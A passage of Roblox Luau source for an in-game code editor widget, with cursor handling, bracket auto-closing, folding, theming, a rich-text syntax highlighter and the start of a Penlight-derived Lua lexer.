		AddingText = false,
		IsTyping = false,
		MovingCursor = false,
		AutocompleteWasVisible = false,
		
		FocusedFirst = false,
		
		HoldingDownMouse = false,
		MouseDragging = false,
		KeybindScrolling = false,
		
		SyntaxVisible = true,
		AutoCloseBracketDebounce = true,
	}
	self._values = {
		LastText = 0,
		TypingTick = 0,
		StartDragTime = 0,
		TextSize = 0,
		LastCursorPosition = 0,
		
		BeforeText = "",
	}
	self._brackets = {
		["\""] = "\"";
		["'"] = "'";
		["("] = ")";
		["["] = "]";
		["{"] = "}";
		["`"] = "`";
	}
	self._foldablePattenrs = {
		{"function%s+[%w_:]+%s*%(.-%)", "end"},  -- Functions
		{"if%s+.-%s+then", "end"},              -- If statements
		{"do", "end"},                          -- Do-end blocks
		{"while%s+.-%s+do", "end"},             -- While loops
		{"for%s+.-%s+do", "end"}                -- For loops
	}
	self._config = {
		CURSOR_SPEED = .1,
		TEXT_SIZE = 14,
		
		FOLD_MARKER = "▼ ",
		UNFOLD_MARKER = "▶ ",
		
		HOLD_DOWN_SMOOTHNESS = .15,
	}
	self._properties = {
		PreviousSelection = "",
	}
	self._theme = {
		THEME_COLOR = Color3.fromRGB(255, 0, 0),

		TEXT_COLOR = Color3.fromRGB(235, 235, 235),
		SHADED_TEXT = Color3.fromRGB(150, 150, 150),

		OUTLINE = Color3.fromRGB(50, 50, 50),
	}
	self._onEditFunctions = {}

	local codeEditor = script.Textbox:Clone()
	codeEditor.Parent = self._data.Parent
	local main = codeEditor.Main
	local others = codeEditor.Others
	
	self._main = main
	self._others = others
	
	self._codeEditor = codeEditor
	self._editor = script.Parent.Parent.Parent.Codebox.Textbox
	self._lines = script.Parent.Parent.Parent.Codebox.Textbox.Lines
	self._textbox = self._editor.Input
	self._fakeTextbox = Instance.new("TextBox")
	self._indentLinesFolder = Instance.new("Folder")
	self._syntaxHighlightingFolder = self._textbox:FindFirstChild("SyntaxLines")
	self._highlightFolder = Instance.new("Folder", self._textbox)
	
	self._highlightFolder.Name = "Highlights"
	
	self._modules.Highlighter.UpdateColors({
		background = {Color = self._data.Parent.BackgroundColor3},
	})

	repeat task.wait() until game:IsLoaded()
	
	--// 機能 \\--
	
	self.validateConfig = function(defaults, newConfig)
		for index, value in pairs(defaults) do
			if newConfig[index] == nil then
				newConfig[index] = value
			end
		end
		return newConfig
	end
	
	self.addConnection = function(name, connection)
		table.insert(self._connections, {Name = name, Connection = connection})
	end

	self.removeConnection = function(name)
		for index, connection in pairs(self._connections) do
			if connection.Name == name and connection.Connection then
				connection.Connection:Disconnect()
				table.remove(self._connections, index)
			end
		end
	end
	
	self.getInputed = function()
		if self._states.IsTyping or self._states.RemovingText or self._states.AddingText or self._states.MovingCursor then
			return true
		end
		
		return false
	end
	
	self.updateStates = function()
		if #self._textbox.Text < self._values.LastText then
			self._states.RemovingText = true
			self._states.AddingText = false
		elseif #self._textbox.Text > self._values.LastText then
			self._states.RemovingText = false
			self._states.AddingText = true
		elseif #self._textbox.Text == self._values.LastText then
			self._states.RemovingText = false
			self._states.AddingText = false
		end
		
		self._states.IsTyping = true
		self._values.TypingTick = 0
	end
	
	self.getAutocompleteVisible = function(cursor)
		local getSuggestion = self._modules.Autocomplete:getWordAtCursor(self._textbox.CursorPosition)
		if getSuggestion then
			if (not cursor) and (not self._services.UserInputService.TouchEnabled) then
				self._modules.Autocomplete:setFrameVisible(true)
			end
		else
			spawn(function()
				if self._states.AutocompleteWasVisible then
					self._modules.Autocomplete:setFrameVisible(false)
				end
			end)
		end
	end
	
	self.textUpdate = function()
		self.updateStates()
		
		self._modules.Lines:update()
		self._modules.Highlighter.Highlight(self._textbox, self._textbox.Text)
		
		if self._states.Focused then
			if self._services.UserInputService.TouchEnabled then
				task.spawn(function()
					self.setSyntaxVisible(false)
				end)
			end
		end
		task.spawn(function()
			for _, func in ipairs(self._onEditFunctions) do
				if not (type(func) == "function") then
					return
				end
				func()
			end
		end)
		
		self.getAutocompleteVisible()
		self.updateIndentationGuide()
	end
	
	self.cursorUpdate = function()
		self._states.MovingCursor = true
		self._values.LastCursorPosition = self._textbox.CursorPosition + 1
		
		self.getAutocompleteVisible(true)
		
		task.spawn(function()
			if not self._states.Focused then
				self._fakeTextbox.CursorPosition = -1
			else
				self._fakeTextbox.CursorPosition = self._textbox.CursorPosition
			end

			if self._fakeTextbox.CursorPosition == -1 then
				return
			end

			self._modules.CustomInput:update({
				focused = self._states.Focused,
				isInputed = self.getInputed(),
				speed = self._config.CURSOR_SPEED,
			})
			self._modules.Lines:update()
			
			local cursorPos = self._textbox.CursorPosition - 1
			local cursorLines = (cursorPos > #self._textbox.Text and self._textbox.Text .. (" "):rep(cursorPos - #self._textbox.Text) or self._textbox.Text):sub(0, cursorPos):split("\n")
			local cursorLineText = cursorLines[#cursorLines]
			local cursorWidth = self._services.TextService:GetTextSize(cursorLineText, self._textbox.TextSize, self._textbox.Font, Vector2.new(math.huge, math.huge)).X
			
			self._modules.Autocomplete:setPosition({
				position = UDim2.new(0,cursorWidth,0, self._values.TextSize.Y * (#cursorLines - 1) + self._values.TextSize.Y + 3),
				speed = self._config.CURSOR_SPEED,
			})
			
			while self._states.HoldingDownMouse do
				if tick() - self._values.StartDragTime >= 1 then
					self._states.MouseDragging = true
					self.updateCanvasPos()
				end
				task.wait()
			end
			self._states.MouseDragging = false
		end)
		
		spawn(function()
			task.wait()
			self._values.LastCursorPosition = self._textbox.CursorPosition
		end)
	end
	
	self.setSyntaxVisible = function(boolean)
		self._syntaxHighlightingFolder = self._textbox:FindFirstChild("SyntaxLines")
		self._states.SyntaxVisible = boolean
		
		self._modules.CustomInput:setVisible(boolean)
		
		for _, label in ipairs(self._syntaxHighlightingFolder:GetChildren()) do
			local name = string.lower("Line_")
			if string.lower(label.Name:sub(1,5)) == name then
				label.Visible = boolean
			end
		end
		for _, indentation in ipairs(self._indentLinesFolder:GetChildren()) do
			if indentation:IsA("Frame") then
				indentation.Visible = boolean
			end
		end
	end
	
	self.changeTheme = function(theme)
		theme = self.validateConfig({
			THEME_COLOR = Color3.fromRGB(255, 0, 0),
			
			TEXT_COLOR = Color3.fromRGB(235, 235, 235),
			SHADED_TEXT = Color3.fromRGB(150, 150, 150),
			
			OUTLINE = Color3.fromRGB(50, 50, 50),
			
			DARK_BACKGROUND = Color3.fromRGB(0, 0, 0),
			SELECT_BACKGROUND = Color3.fromRGB(235, 235, 235),
			
			LINE_HIGHLIGHER_OUTLINE_TRANSPARENCY = .5,
		}, theme or {})
		pcall(function()
			codeEditor.Main.Lines.Label.TextColor3 = theme.SHADED_TEXT
			codeEditor.Main.Lines.Label.UIStroke.Color = theme.OUTLINE
		end)
		
		codeEditor.Others.Hidden.Icon.ImageColor3 = theme.THEME_COLOR
		codeEditor.Others.Hidden.TextLabel.TextColor3 = theme.TEXT_COLOR
		
		self._modules.Lines:changeTextbold(theme.TEXT_COLOR)
		self._modules.Autocomplete:changeTheme(theme)
		self._modules.CustomInput:changeTheme(theme)
		
		self._theme = theme
	end
	
	self.findFoldableBlocks = function(text)
		local blocks = {}
		local stack = {}
		local lines = string.split(text, "\n")

		for i, line in ipairs(lines) do
			for _, pattern in ipairs(self._foldablePattenrs) do
				local startPattern, endPattern = pattern[1], pattern[2]

				if string.match(line, startPattern) then
					table.insert(stack, {start = i, endPattern = endPattern})
				elseif string.match(line, endPattern) then
					local block = table.remove(stack)
					if block then
						block["end"] = i
						table.insert(blocks, block)
					end
				end
			end
		end
		return blocks
	end
	
	self.applyFolding = function(textbox, blocks)
		local lines = string.split(textbox.Text, "\n")
		local folded = {}

		for _, block in ipairs(blocks) do
			local start, stop = block.start, block["end"]
			lines[start] = self._config.FOLD_MARKER .. lines[start]
			for i = start + 1, stop do
				folded[i] = true
			end
		end

		local newText = {}
		for i, line in ipairs(lines) do
			if not folded[i] then
				table.insert(newText, line)
			end
		end

		textbox.Text = table.concat(newText, "\n")
	end
	
	self.updateIndentationGuide = function()
		self._indentLinesFolder.Parent = self._textbox
		self._indentLinesFolder.Name = "IndentLines"
		
		for _, child in pairs(self._indentLinesFolder:GetChildren()) do
			if child:IsA("Frame") and child.Name == "IndentLine" then
				child:Destroy()
			end
		end
		
		local lines = self._textbox.Text:split("\n")
		for lineIndex, line in ipairs(lines) do
			local indentationLevel = 0

			for char in line:gmatch(".") do
				if char == " " then
					indentationLevel += 0.25
				elseif char == "\t" or char == "" then
					indentationLevel += 1
				else
					break
				end
			end

			for i = 1, math.floor(indentationLevel) do
				local function getSecondPos(level, divide)
					if not level then level = 1 end
					if (i - 1) ~= 1 then
						return (.5*(level))
					end
					return 1
				end

				i -= 1

				task.spawn(function()
					repeat task.wait() until type(self._values.TextSize) ~= "number"
					local indentLine = Instance.new("Frame")
					indentLine.Name = "IndentLine"
					indentLine.Size = UDim2.new(0, 1, 0, self._values.TextSize.Y + 2)
					indentLine.Position = UDim2.new(0, (i * (self._values.TextSize.Y*2)+(i*2))-2, 0, (lineIndex - 1) * self._values.TextSize.Y)
					indentLine.BackgroundColor3 = self._theme.OUTLINE
					indentLine.BackgroundTransparency = .5
					indentLine.Parent = self._indentLinesFolder
				end)
			end
		end
	end
	
	self.updateCanvasPos = function()
		local cursorPos = self._textbox.CursorPosition - 1
		local cursorLines = (cursorPos > #self._textbox.Text and self._textbox.Text .. (" "):rep(cursorPos - #self._textbox.Text) or self._textbox.Text):sub(0, cursorPos):split("\n")

		pcall(function()
			self._modules.Shared:tween(self._editor, TweenInfo.new(self._config.HOLD_DOWN_SMOOTHNESS), {CanvasPosition = Vector2.new(self._editor.CanvasPosition.X, self._values.TextSize.Y * (#cursorLines - 1))})
		end)
	end
	
	--// スクリプト \\--
	self._modules.Lines:set({
		textbox = self._textbox,
		label = self._lines.Label,
		editor = self._editor,
		textBold = self._theme.TEXT_COLOR,
	})
	self._modules.CustomInput:set({
		textbox = self._textbox,
	})
	self._modules.Indenter:set({
		textbox = self._textbox,
	})
	self._modules.Autocomplete:set({
		textbox = self._textbox,
	})
	
	self.textUpdate()
	self.cursorUpdate()
	
	--// 入力 \\--
	self.addConnection("InputBegan", self._services.UserInputService.InputBegan:Connect(function(input)
		if not self._states.Focused then return end
		if input.KeyCode == Enum.KeyCode.Tab then
			spawn(function()
				self._modules.Indenter:updateMousePos()
			end)
		end
		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			self._states.HoldingDownMouse = true
		end
		if input.KeyCode == Enum.KeyCode.Backspace then
			self._states.RemovingText = true
			
			local text = self._modules.Shared:removeControlBytes(self._textbox.Text)
			local afterChar = string.sub(text, self._textbox.CursorPosition, self._textbox.CursorPosition)
			local beforeChar = string.sub(self._modules.Shared:removeControlBytes(self._values.BeforeText), self._textbox.CursorPosition, self._textbox.CursorPosition)
			
			for index, value in pairs(self._brackets) do
				if beforeChar == index and afterChar == value then
					self._textbox.Text = string.sub(text, 1, self._textbox.CursorPosition - 1)..string.sub(text, self._textbox.CursorPosition+1)
					self._values.BeforeText = self._textbox.Text
				end
			end
		end
		if input.KeyCode == Enum.KeyCode.Return then
			self._textbox:CaptureFocus()
			self._modules.Indenter:indentBrackets()
			
			--[[
			local allLines = self._textbox.Text:split("\n")
			local currentLine = #allLines

			local newIndentation = self._modules.Indenter:autoIndent(currentLine, allLines)

			local cursorPos = self._textbox.CursorPosition + 1
			local textBeforeCursor = self._textbox.Text:sub(1, cursorPos)
			local textAfterCursor = self._textbox.Text:sub(cursorPos + 1)
			
			if newIndentation ~= nil or newIndentation ~= "" then
				self._textbox.Text = textBeforeCursor .. "" .. newIndentation .. textAfterCursor
				self._textbox.CursorPosition = cursorPos + (#newIndentation)
			end
			]]
		end
		if input.KeyCode == Enum.KeyCode.Up then
			self._states.KeybindScrolling = true
			self._modules.Autocomplete:selectUp()
			if self._states.AutocompleteWasVisible then
				self._values.LastCursorPosition = self._textbox.CursorPosition
				self._textbox.CursorPosition = self._values.LastCursorPosition
			end
		end
		if input.KeyCode == Enum.KeyCode.Down then
			self._states.KeybindScrolling = true
			self._modules.Autocomplete:selectDown()
			if self._states.AutocompleteWasVisible then
				self._values.LastCursorPosition = self._textbox.CursorPosition
				self._textbox.CursorPosition = self._values.LastCursorPosition
			end
		end
	end))
	
	self.addConnection("InputEnded", self._services.UserInputService.InputEnded:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			self._states.HoldingDownMouse = false
		end
		if input.KeyCode == Enum.KeyCode.Up or input.KeyCode == Enum.KeyCode.Down then
			self._states.KeybindScrolling = false
		end
	end))
	
	--// イベント \\--
	self.addConnection("TextboxEdited", self._textbox:GetPropertyChangedSignal("Text"):Connect(function()
		self.textUpdate()
		if not self._states.RemovingText then
			self._modules.Autocomplete:completeBracket({
				autocompleteCharacters = self._brackets,
				debounce = self._states.AutoCloseBracketDebounce,
				focused = self._states.Focused,
			})
		end
		self._states.AutoCloseBracketDebounce = false
		
		self._states.AutocompleteWasVisible = self._modules.Autocomplete:isVisible()
		
		spawn(function()
			task.wait()
			self._values.BeforeText = self._textbox.Text
		end)
	end))
	self.addConnection("PlaceholderEdited", self._data.Parent:GetPropertyChangedSignal("BackgroundColor3"):Connect(function()
		self._textbox.PlaceholderColor3 = self._data.Parent.BackgroundColor3
	end))
	self.addConnection("TextboxCursorChanged", self._textbox:GetPropertyChangedSignal("CursorPosition"):Connect(function()
		self.cursorUpdate()
		spawn(function()
			self._states.AutocompleteWasVisible = self._modules.Autocomplete:isVisible()
		end)
	end))
	self.addConnection("TextboxFocused", self._textbox.Focused:Connect(function()
		self._states.Focused = true
		self.cursorUpdate()
		self._modules.Autocomplete:setFrameVisible(false)
		if self._services.UserInputService.TouchEnabled then
			self.setSyntaxVisible(false)
		end
	end))
	self.addConnection("TextboxFocuslost", self._textbox.FocusLost:Connect(function(enterPressed)
		self._states.Focused = false
		if self._modules.Autocomplete:isVisible() then
			if enterPressed then
				self._modules.Autocomplete:completeWord()
				--[[
				spawn(function()
					self._textbox.CursorPosition = self._textbox.CursorPosition
						+ #self._modules.Autocomplete:getCurrentWord() + 2
				end)
				]]
			end
			self._modules.Autocomplete:setFrameVisible(false)
		end
		self.cursorUpdate()
		if self._services.UserInputService.TouchEnabled then
			self.setSyntaxVisible(true)
		end
	end))
	self.addConnection("CanvasSizeChanged", self._editor:GetPropertyChangedSignal("CanvasSize"):Connect(function()
		self.updateCanvasPos()
	end))
	self.addConnection("Rendered", self._services.RunService.RenderStepped:Connect(function()
		self._values.LastText = #self._textbox.Text
		
		self._states.Focused = self._textbox:IsFocused()
		
		self._lines.CanvasSize = UDim2.new(0, 0, 0, self._editor.CanvasSize.Y.Offset)
		self._lines.CanvasPosition = Vector2.new(0, self._editor.CanvasPosition.Y)
		
		self._values.TextSize = self._services.TextService:GetTextSize("", self._textbox.TextSize, self._textbox.Font, Vector2.new());
		
		self._textbox.TextSize = self._config.TEXT_SIZE
		self._lines.Label.TextSize = self._config.TEXT_SIZE
		
		if self._states.KeybindScrolling then
			self.updateCanvasPos()
		end
		
		if self.getInputed() and not self._states.FocusedFirst then
			if self._values.TypingTick >= 25 then
				self._states.IsTyping = false
				self._states.AddingText = false
				self._states.RemovingText = false
				self._states.MovingCursor = false
				
				self._values.TypingTick = 0
				self._modules.CustomInput:update({
					focused = self._states.Focused,
					isInputed = self._states.IsTyping,
					speed = self._config.CURSOR_SPEED,
				})
				return
			end
			self._values.TypingTick += 1
		else
			self._states.FocusedFirst = false
		end
		
		if not self._states.AutoCloseBracketDebounce then
			self._states.AutoCloseBracketDebounce = true
		end
		if not self._states.SyntaxVisible then
			self._textbox.TextColor3 = self._modules.Highlighter.TokenColors.iden.Color
			self._textbox.TextTransparency = 0
		else
			self._textbox.TextColor3 = self._modules.Highlighter.TokenColors.background.Color
			self._textbox.TextTransparency = 0.5
		end
	end))
	
	self._values.LastText = #self._textbox.Text
	self._values.LastCursorPosition = #self._textbox.Text + 1
	self._values.BeforeText = self._textbox.Text
	self._textbox.PlaceholderColor3 = self._data.Parent.BackgroundColor3
	self._textbox.TextColor3 = self._data.Parent.BackgroundColor3
	
	self.changeTheme()
	
	return self
end

-- // 方法 \\ --
function Kodobokkusu:Write(text)
	self._textbox.Text = text
	self._textbox.CursorPosition = #self._textbox.Text
end

function Kodobokkusu:Hide()
	self._main.Visible = false
	self._others.Hidden.Visible = true
	
	self._others.Hidden.Icon.ImageTransparency = 1
	self._others.Hidden.TextLabel.TextTransparency = 1
	self._others.Hidden.Icon.Position = UDim2.new(.5, 0, .4, 0)
	self._others.Hidden.TextLabel.Position = UDim2.new(.5, 0, .6, 0)
	
	self._modules.Shared:tween(self._others.Hidden.Icon, TweenInfo.new(.5), {
		ImageTransparency = 0,
		Position = UDim2.new(.5, 0, .3, 0),
	})
	self._modules.Shared:tween(self._others.Hidden.TextLabel, TweenInfo.new(.5), {
		TextTransparency = 0,
		Position = UDim2.new(.5, 0, .55, 0)
	})
end

function Kodobokkusu:Unhide()
	self._main.Visible = true
	self._others.Hidden.Visible = false
end

function Kodobokkusu:Clear()
	self:Write("")
end

function Kodobokkusu:ChangeSyntaxColor(colors)
	self._modules.Highlighter.UpdateColors(colors)
end

function Kodobokkusu:ChangeTheme(themeTable)
	self.changeTheme(themeTable)
end

function Kodobokkusu:SetCursorPosition(position)
	self._textbox.CursorPosition = position
end

function Kodobokkusu:SetTextSize(size)
	self._config.TEXT_SIZE = size
end

function Kodobokkusu:Beautify()
	self._textbox.Text = self._modules.Beautify(self._textbox.Text)
end

function Kodobokkusu:Obfuscate()
	self._textbox.Text = self._modules.Obfuscate(self._textbox.Text)
end

-- // フェッチメソッド \\ --
function Kodobokkusu:GetText()
	return self._textbox.Text
end

function Kodobokkusu:GetCursorPos()
	return self._textbox.CursorPosition
end

function Kodobokkusu:CountLines()
	return #self._textbox.Text:split("\n")
end

function Kodobokkusu:OnEdit(func)
	table.insert(self._onEditFunctions, func)
end

function Kodobokkusu:Destroy()
	for _, v in pairs(self._connections) do
		v:Disconnect()
	end
	self._codeEditor:Destroy()
	self._onEditFunctions = {}
	self._connections = {}
end

return Kodobokkusu

end;
};
G2L_MODULES[G2L["27"]] = {
Closure = function()
    local script = G2L["27"];local Lexer = require(script.Lexer)

local TextService = game:GetService("TextService");

local TokenColors = table.create(8);
local TokenFormats = table.create(7)
local ActiveLabels = table.create(3)

local CurrentTextbox = nil

local function SanitizeRichText(s)
	return string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(s,
		"&", "&amp;"),
		"<", "&lt;"),
		">", "&gt;"),
		"\"", "&quot;"),
		"'", "&apos;"
	)
end

local function SanitizeTabs(s)
	return string.gsub(s, "\t", "    ")
end

local function SanitizeControl(s)
	return string.gsub(s, "[\0\1\2\3\4\5\6\7\8\11\12\13\14\15\16\17\18\19\20\21\22\23\24\25\26\27\28\29\30\31]+", "")
end

local function highlight(textObject, src, underlineLinks)
	local linesFolder = nil
	src = SanitizeTabs(SanitizeControl(src or textObject.Text))
	
	textObject.RichText = false
	textObject.Text = src
	textObject.TextXAlignment = Enum.TextXAlignment.Left
	textObject.TextYAlignment = Enum.TextYAlignment.Top
	--textObject.BackgroundColor3 = TokenColors.background
	textObject.TextColor3 = TokenColors.background.Color
	textObject.TextTransparency = .5
	
	if textObject:FindFirstChild("SyntaxLines") then
		linesFolder = textObject:FindFirstChild("SyntaxLines")
	else
		linesFolder = Instance.new("Folder", textObject)
		linesFolder.Name = "SyntaxLines"
	end
	
	if textObject:IsA("TextBox") then
		CurrentTextbox = textObject
	end

	local textSize = textObject.TextSize

	local _, numLines = string.gsub(src, "\n", "")
	numLines += 1

	local size = TextService:GetTextSize("", textObject.TextSize, textObject.Font, Vector2.new());

	local lineLabels = ActiveLabels[textObject]
	if not lineLabels then
		-- No existing lineLabels, create all new
		lineLabels = table.create(numLines)
		for i = 1, numLines do
			local lineLabel = Instance.new("TextLabel")
			--local selectionHighlight = script.SelectionHighlighter:Clone()
			lineLabel.Name = "Line_" .. i
			lineLabel.RichText = true
			lineLabel.BackgroundTransparency = 1
			lineLabel.TextXAlignment = Enum.TextXAlignment.Left
			lineLabel.TextYAlignment = Enum.TextYAlignment.Top
			lineLabel.TextColor3 = TokenColors.iden.Color
			lineLabel.Font = textObject.Font
			lineLabel.TextSize = textSize
			lineLabel.ZIndex = textObject.ZIndex + 2
			lineLabel.AutomaticSize = Enum.AutomaticSize.X

			lineLabel.Size = UDim2.new(1, 0, 0, size.Y)
			lineLabel.Position = UDim2.fromOffset(0, size.Y * textObject.LineHeight * (i - 1))
			lineLabel.Text = ""

			lineLabel.Parent = linesFolder
			lineLabels[i] = lineLabel
			
			--selectionHighlight.Parent = lineLabel
			--selectionHighlight.Size = UDim2.new(0,0,1,0)
		end
	elseif #lineLabels < numLines then
		-- Existing labels, but missing some lines
		for i = #lineLabels + 1, numLines do
			local lineLabel = Instance.new("TextLabel")
			--local selectionHighlight = script.SelectionHighlighter:Clone()
			lineLabel.Name = "Line_" .. i
			lineLabel.RichText = true
			lineLabel.BackgroundTransparency = 1
			lineLabel.TextXAlignment = Enum.TextXAlignment.Left
			lineLabel.TextYAlignment = Enum.TextYAlignment.Top
			lineLabel.TextColor3 = TokenColors.iden.Color
			lineLabel.Font = textObject.Font
			lineLabel.TextSize = textSize
			lineLabel.BorderColor3 = Color3.fromRGB(53, 17, 255)
			lineLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			lineLabel.ZIndex = textObject.ZIndex + 2
			lineLabel.AutomaticSize = Enum.AutomaticSize.X

			lineLabel.Size = UDim2.new(1, 0, 0, size.Y)
			lineLabel.Position = UDim2.fromOffset(0, size.Y * textObject.LineHeight * (i - 1))
			lineLabel.Text = ""

			lineLabel.Parent = linesFolder
			lineLabels[i] = lineLabel
			--selectionHighlight.Parent = lineLabel
			--selectionHighlight.Size = UDim2.new(0,0,1,0)
		end
	elseif #lineLabels > numLines then
		-- Existing labels, with too many lines
		for i = #lineLabels, numLines, -1 do
			lineLabels[i].Text = ""
		end
	end

	local richText, index, lineNumber = {}, 0, 1
	for token, content in Lexer.scan(src) do
		local Color = TokenColors[token] or TokenColors.iden.Color

		local lines = string.split(SanitizeRichText(content), "\n")
		for l, line in ipairs(lines) do
			if l > 1 then
				-- Set line
				lineLabels[lineNumber].Text = table.concat(richText)
				-- Move to next line
				lineNumber += 1
				index = 0
				table.clear(richText)
			end

			index += 1
			if Color ~= TokenColors.iden.Color and string.find(line, "[%S%C]") then
				richText[index] = string.format(TokenFormats[token], line)
			else
				richText[index] = line
			end
		end
	end

	-- Set final line
	lineLabels[lineNumber].Text = table.concat(richText)

	ActiveLabels[textObject] = lineLabels

	local Cleanup
	Cleanup = textObject.AncestryChanged:Connect(function()
		if textObject.Parent then
			return
		end
		ActiveLabels[textObject] = nil
		Cleanup:Disconnect()
	end)

	return function()
		for _, label in ipairs(lineLabels) do
			label:Destroy()
		end
		table.clear(lineLabels)

		ActiveLabels[textObject] = nil
		Cleanup:Disconnect()
	end
end

-- ty synapse
--[[export type HighlighterColors = {
	background: Color3?,
	iden: Color3?,
	keyword: Color3?,
	builtin: Color3?,
	string: Color3?,
	number: Color3?,
	comment: Color3?,
	operator: Color3?
}]]

local function updateColors(colors)
	-- Setup color data
	TokenColors.background = (colors and colors.background) or {Color = Color3.fromRGB(255, 255, 255)}
	TokenColors.iden = (colors and colors.iden) or {Color = Color3.fromRGB(156, 220, 254)}
	TokenColors.keyword = (colors and colors.keyword) or {Color = Color3.fromRGB(255, 173, 250)}
	TokenColors.variable = (colors and colors.variable) or {Color = Color3.fromRGB(102, 186, 255)}
	TokenColors.builtin = (colors and colors.builtin) or {Color = Color3.fromRGB(255, 255, 197)}
	TokenColors.string = (colors and colors.string) or {Color = Color3.fromRGB(255, 179, 149)}
	TokenColors.number = (colors and colors.number) or {Color = Color3.fromRGB(224, 255, 208)}
	TokenColors.comment = (colors and colors.comment) or {Color = Color3.fromRGB(152, 216, 120)}
	TokenColors.operator = (colors and colors.operator) or {Color = Color3.fromRGB(255, 215, 0)}
	TokenColors.localmethod = (colors and colors.localmethod) or {Color = Color3.fromRGB(255, 255, 197)}
	TokenColors.properties = (colors and colors.properties) or {Color = Color3.fromRGB(88, 210, 255)}
	TokenColors.boolean = (colors and colors.boolean) or {Color = Color3.fromRGB(102, 186, 255)}
	TokenColors.localproperty = (colors and colors.localproperty) or {Color = Color3.fromRGB(99, 255, 221)}
	TokenColors.todo = (colors and colors.todo) or {Color = Color3.fromRGB(255, 201, 37), IsBold = true}
	TokenColors.link = (colors and colors.link) or {Color = Color3.fromRGB(51, 173, 255), IsUnderlined = true}
	TokenColors.custom = (colors and colors.custom) or {Color = Color3.fromRGB(144, 194, 255), IsBold = true}

	for key, value in pairs(TokenColors) do
		if not value.IsBold then
			TokenFormats[key] = '<font color="#'.. string.format("%.2x%.2x%.2x", value.Color.R * 255, value.Color.G * 255, value.Color.B * 255).. '">%s</font>'
		else
			TokenFormats[key] = '<b><font color="#'.. string.format("%.2x%.2x%.2x", value.Color.R * 255, value.Color.G * 255, value.Color.B * 255).. '">%s</font></b>'
		end
		if value.IsItalicized then
			TokenFormats[key] = string.format("<i>%s</i>", TokenFormats[key])
		end
		if value.IsUnderlined then
			TokenFormats[key] = string.format("<u>%s</u>", TokenFormats[key])
		end
	end

	-- Rehighlight existing labels using latest colors
	for label, lineLabels in pairs(ActiveLabels) do
		for _, lineLabel in ipairs(lineLabels) do
			lineLabel.TextColor3 = TokenColors.iden.Color
		end
		highlight(label)
	end
end

pcall(updateColors)
task.spawn(function()
	repeat task.wait() until CurrentTextbox
	local function Update()
		for label, lineLabels in pairs(ActiveLabels) do
			for i, lineLabel in ipairs(lineLabels) do
				local size = TextService:GetTextSize("", CurrentTextbox.TextSize, CurrentTextbox.Font, Vector2.new());
				lineLabel.TextColor3 = TokenColors.iden.Color
				lineLabel.TextSize = CurrentTextbox.TextSize
				lineLabel.Position = UDim2.fromOffset(0, size.Y * CurrentTextbox.LineHeight * (i - 1))
				lineLabel.Size = UDim2.new(1, 0, 0, size.Y)
			end
			highlight(label)
		end
	end
	CurrentTextbox:GetPropertyChangedSignal("TextSize"):Connect(function()
		Update()
	end)
	pcall(function()
		Update()
	end)
end)

return setmetatable({
	UpdateColors = updateColors,
	Highlight = highlight,
	TokenColors = TokenColors,
}, {
	__call = function(_, textObject, src)
		return highlight(textObject, src)
	end
})

end;
};
G2L_MODULES[G2L["28"]] = {
Closure = function()
    local script = G2L["28"];--[=[
	Lexical scanner for creating a sequence of tokens from Lua source code.
	This is a heavily modified and Roblox-optimized version of
	the original Penlight Lexer module:
		https://github.com/stevedonovan/Penlight
	Authors:
		stevedonovan <https://github.com/stevedonovan> ----------- Original Penlight lexer author
		ryanjmulder <https://github.com/ryanjmulder> ------------- Penlight lexer contributer
		mpeterv <https://github.com/mpeterv> --------------------- Penlight lexer contributer
		Tieske <https://github.com/Tieske> ----------------------- Penlight lexer contributer
		boatbomber <https://github.com/boatbomber> --------------- Roblox port, added builtin token,
		                                                           added patterns for incomplete syntax, bug fixes,
		                                                           behavior changes, token optimization, thread optimization
		                                                           Added lexer.navigator() for non-sequential reads
		Sleitnick <https://github.com/Sleitnick> ----------------- Roblox optimizations
		howmanysmall <https://github.com/howmanysmall> ----------- Lua + Roblox optimizations

	List of possible tokens:
		- iden
		- keyword
		- builtin
		- string
		- number
		- comment
		- operator
--]=]

local lexer = {}

local Prefix, Suffix, Cleaner = "^[%c%s]*", "[%c%s]*", "[%c%s]+"
local UNICODE = "[%z\x01-\x7F\xC2-\xF4][\x80-\xBF]+"
local NUMBER_A = "0x[%da-fA-F]+"
local NUMBER_B = "%d+%.?%d*[eE][%+%-]?%d+"
local NUMBER_C = "%d+[%._]?[%d_eE]*"
local OPERATORS = "[:;<>/~%*%(%)%-={},%.#%^%+%%]+"
local BRACKETS = "[%[%]]+" -- needs to be separate pattern from other operators or it'll mess up multiline strings
local IDEN = "[%a_][%w_]*"
local STRING_EMPTY = "(['\"])%1" --Empty String
local STRING_PLAIN = "(['\"])[^\n]-([^\\]%1)" --TODO: Handle escaping escapes
local STRING_INCOMP_A = "(['\"]).-\n" --Incompleted String with next line
local STRING_INCOMP_B = "(['\"])[^\n]*" --Incompleted String without next line
local STRING_MULTI = "%[(=*)%[.-%]%1%]" --Multiline-String
local STRING_MULTI_INCOMP = "%[=*%[.-.*" --Incompleted Multiline-String
local COMMENT_MULTI = "%-%-%[(=*)%[.-%]%1%]" --Completed Multiline-Comment
local COMMENT_MULTI_INCOMP = "%-%-%[=*%[.-.*" --Incompleted Multiline-Comment
local COMMENT_PLAIN = "%-%-.-\n" --Completed Singleline-Comment
local COMMENT_INCOMP = "%-%-.*" --Incompleted Singleline-Comment
--local TYPED_VAR = ":%s*([%w%?%| \t]+%s*)" --Typed variable, parameter, function 
local lang = require(script.Language)
local lua_keyword = lang.keyword
local lua_variables = lang.variables
local lua_builtin = lang.builtin
local lua_selection = lang.selection
local lua_libraries = lang.libraries
local lua_properties = lang.properties
local lua_booleans = lang.booleans
local lua_comments = lang.comments
local lua_customKeywords = lang.customKeywords

local lua_matches = {
	-- Indentifiers
	{ Prefix .. IDEN .. Suffix, "var" },
	--{ Prefix .. TYPED_VAR .. Suffix, "localmethod" },

	-- Numbers
	{ Prefix .. NUMBER_A .. Suffix, "number" },
	{ Prefix .. NUMBER_B .. Suffix, "number" },
	{ Prefix .. NUMBER_C .. Suffix, "number" },

	-- Strings
	{ Prefix .. STRING_EMPTY .. Suffix, "string" },
	{ Prefix .. STRING_PLAIN .. Suffix, "string" },
	{ Prefix .. STRING_INCOMP_A .. Suffix, "string" },
	{ Prefix .. STRING_INCOMP_B .. Suffix, "string" },
	{ Prefix .. STRING_MULTI .. Suffix, "string" },
